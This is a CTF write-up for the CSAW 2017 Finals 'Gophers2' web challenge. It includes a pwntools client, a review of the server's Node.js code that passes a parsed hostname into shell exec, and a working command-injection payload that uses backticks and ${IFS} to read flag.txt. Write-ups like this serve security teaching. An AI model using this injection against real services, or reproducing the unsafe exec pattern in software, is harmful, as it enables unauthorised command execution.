[writeup by @bonaff]

**CTF:** CSAW CTF Final Round 2017

**Team:** spritzers (from [SPRITZ Research Group](http://spritz.math.unipd.it/))

**Task:** Web / Gophers2

**Points:** 200

> Solve Gophers1, and it will tell you what to do.

For this challenge I reused the client from the Gophers1 challange (let's call it `pwn_client.py`):

```python
#!/usr/bin/env python2

import sys
import random
from pwn import *

DH_P = 251
DH_G = 6

def request(data):
    p = remote('web.chal.csaw.io', 4333)

    # Diffie-Hellman key exchange
    dh_a = random.randint(0, 255)
    dh_A = (DH_G ** dh_a) % DH_P
    p.send(p8(dh_A))
    dh_B = u8(p.recvn(1))
    s = (dh_B ** dh_a) % DH_P

    crypt = lambda x : ''.join([chr(ord(c) ^ s) for c in x])

    p.send(crypt(data))
    return crypt(p.recvall())

if len(sys.argv) >= 2:
    print request(sys.argv[1])
```

Sending a `/` returns "Hey man, I heard you like writing clients, try writing a server!", with the source code of the remote server.
Time for some code review!

From the first lines of code we can see that the flag is in the root directory:

```javascript
const FLAG = readFileSync('/flag.txt');
```

But this constant is never used in the code, so we are looking for some kind of file disclosure / remote code execution.

Then there are some app.selector:

```javascript
app.selector('/', function(req, res, done){
```

This is the index that we've seen before. Nothing fancy.

```javascript
app.selector('/reset', function(req, res, done){
[...]
```

This will reset a sandbox (see below).

```javascript
app.selector('/run_client', function(req, res, done) { [..] }
```

Finally, this will get a hostname and a port, and will connect to that host:port using gopher2. The way it does this is quite interesting:

1. First, it creates a sandbox and copies a client script named `client.py`.
2. Then, it checks that the hostname and the port are valid by creating an URL object.
3. Finally, it passes the hostname and the port to the client by calling **`exec`**.

Here's the code:

```javascript
let {host, port} = req.params;
  let _url = `gopherz2://${host}:${port}`; 
  let url;
  try {
    url = new URL(_url);
  } catch (e) {
    res.listing([{
      type: 'E',
      data: 'Yeah that\'s not going to work',
    }]);
    return done();
  }
  host = url.hostname;
  port = url.port;                        

  let sandbox = sandbox_directory(req.client.remoteAddress);  
  if (host && port) {
    waterfall([
      (cb) => { 
        exec(`mkdir ${sandbox} && chmod +rwx ${sandbox} && cp client.py ${sandbox}/ && chmod 777 ${sandbox}`, (err, stderr, stdout) => { if (err) cb(stderr); else cb(); });
      },
      (cb) => {
        exec(`cd ${sandbox} && python3 client.py ${host} ${port}`, 
          (err, stdout, stderr) => {
            if(err) cb(stderr);
            else {
              res.listing([{
                type:'T',
                data: stdout,
              }]);
              done();
            }
        });
      }
    ], (err) => {
      if(err) {
        res.listing([{
          type: 'E',
          data: err
        }]);
        done();
      }
    })
  } else {
    res.listing([{
      type: 'E',
      data: 'host and port wrong'
    }]);
    done();
  }
});
```

Playing a bit with the URL parser, I found that the characters ``$;`{}`` are considered valid in the hostname, so if we forge a host like:

```text
0;`echo${IFS}foo`
```

Bash will throw an error, saying that the command `foo` can't be found. So let's read the flag!

```bash
./pwn_client.py '/run_client\thost:0;`cd${IFS}..;cd${IFS}..;cd${IFS}..;cat${IFS}flag.txt`\tport:444'
```

And this will throw an error with the flag.